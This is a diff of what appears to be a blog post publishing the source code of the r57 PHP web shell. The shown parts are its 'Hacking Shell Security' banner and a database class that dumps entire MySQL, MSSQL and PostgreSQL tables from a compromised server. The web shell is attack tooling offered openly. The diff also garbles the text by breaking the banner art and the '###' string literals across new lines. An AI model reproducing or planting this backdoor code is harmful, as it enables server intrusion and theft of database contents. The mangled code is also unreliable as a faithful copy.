@@ -14,6 +14,7 @@ tags:
 ---
 I&#8217;m pretty sure the r57 and c99 shells are more or less the same, but this r57 shell does look quite different to the usual c99 script.
 
+
 ### r57 Shell Source Code
 
 {% highlight php %}<?php
@@ -22,20 +23,120 @@ I&#8217;m pretty sure the r57 and c99 shells are more or less the same, but this
 /*                                     #    #        #    #
 /*                                     #   #          #   #
 /*                                    #    #          #    #
-/*                                    #   ###   ######   ###   #
-/*                                   ###   ###  #########  ###   ###
-/*                                   ###   ###  #########  ###   ###
-/*                                   ###   ###   ######   ###   ###g
-/*                                   ####   ##################   ####
-/*                                   ####################################
-/*                                 ############ ############### ##########
-/*                                ####   ###  ###############  ###   ####
-/*                                ####   ###  ###############  ###   ####
-/*                                 ####   #  ###############  #   ####
-/*                                 ####   ###  ############  ###   ####
-/*                                  ###    #   #########   #    ###
-/*                                   ###   #    ######   #    ###
-/*                                     ###                 ###
+/*                                    #   
+###   
+###
+###   
+###   #
+/*                                   
+###   
+###  
+###
+###
+###  
+###   
+###
+/*                                   
+###   
+###  
+###
+###
+###  
+###   
+###
+/*                                   
+###   
+###   
+###
+###   
+###   
+###g
+/*                                   
+####   
+###
+###
+###
+###
+###
+###   
+####
+/*                                   
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+###
+/*                                 
+###
+###
+###
+### 
+###
+###
+###
+###
+### 
+###
+###
+####
+/*                                
+####   
+###  
+###
+###
+###
+###
+###  
+###   
+####
+/*                                
+####   
+###  
+###
+###
+###
+###
+###  
+###   
+####
+/*                                 
+####   #  
+###
+###
+###
+###
+###  #   
+####
+/*                                 
+####   
+###  
+###
+###
+###
+###  
+###   
+####
+/*                                  
+###    #   
+###
+###
+###   #    
+###
+/*                                   
+###   #    
+###
+###   #    
+###
+/*                                     
+###                 
+###
 /*								WWW.R57.GEN.TR Hacking Shell Security
 /*
 /*
@@ -461,20 +562,28 @@ class my_sql
   {
    if(empty($table)) return 0;
    $this-&gt;dump=array();
-   $this-&gt;dump[0] = '###';
-   $this-&gt;dump[1] = '### --------------------------------------- ';
-   $this-&gt;dump[2] = '###  Created: '.date ("d/m/Y H:i:s");
-   $this-&gt;dump[3] = '### Database: '.$this-&gt;base;
-   $this-&gt;dump[4] = '###    Table: '.$table;
-   $this-&gt;dump[5] = '### --------------------------------------- ';
+   $this-&gt;dump[0] = '
+###';
+   $this-&gt;dump[1] = '
+### --------------------------------------- ';
+   $this-&gt;dump[2] = '
+###  Created: '.date ("d/m/Y H:i:s");
+   $this-&gt;dump[3] = '
+### Database: '.$this-&gt;base;
+   $this-&gt;dump[4] = '
+###    Table: '.$table;
+   $this-&gt;dump[5] = '
+### --------------------------------------- ';
    switch($this-&gt;db)
     {
   	case 'MySQL':
-  	 $this-&gt;dump[0] = '### MySQL dump';
+  	 $this-&gt;dump[0] = '
+### MySQL dump';
   	 if($this-&gt;query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0;
   	 if(!$this-&gt;get_result()) return 0;
   	 $this-&gt;dump[] = $this-&gt;rows[0]['Create Table'];
-     $this-&gt;dump[] = '### --------------------------------------- ';
+     $this-&gt;dump[] = '
+### --------------------------------------- ';
   	 if($this-&gt;query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0;
   	 if(!$this-&gt;get_result()) return 0;
   	 for($i=0;$i&lt;$this-&gt;num_rows;$i++)
@@ -484,7 +593,8 @@ class my_sql
   	  }
     break;
     case 'MSSQL':
-     $this-&gt;dump[0] = '### MSSQL dump';
+     $this-&gt;dump[0] = '
+### MSSQL dump';
      if($this-&gt;query('SELECT * FROM '.$table)!=1) return 0;
   	 if(!$this-&gt;get_result()) return 0;
   	 for($i=0;$i&lt;$this-&gt;num_rows;$i++)
@@ -494,7 +604,8 @@ class my_sql
   	  }
     break;
     case 'PostgreSQL':
-     $this-&gt;dump[0] = '### PostgreSQL dump';
+     $this-&gt;dump[0] = '
+### PostgreSQL dump';
      if($this-&gt;query('SELECT * FROM '.$table)!=1) return 0;
   	 if(!$this-&gt;get_result()) return 0;
   	 for($i=0;$i&lt;$this-&gt;num_rows;$i++)
@@ -504,8 +615,10 @@ class my_sql
   	  }
     break;
     case 'Oracle':
-      $this-&gt;dump[0] = '### ORACLE dump';
-      $this-&gt;dump[]  = '### under construction';
+      $this-&gt;dump[0] = '
+### ORACLE dump';
+      $this-&gt;dump[]  = '
+### under construction';
     break;
     default:
      return 0;
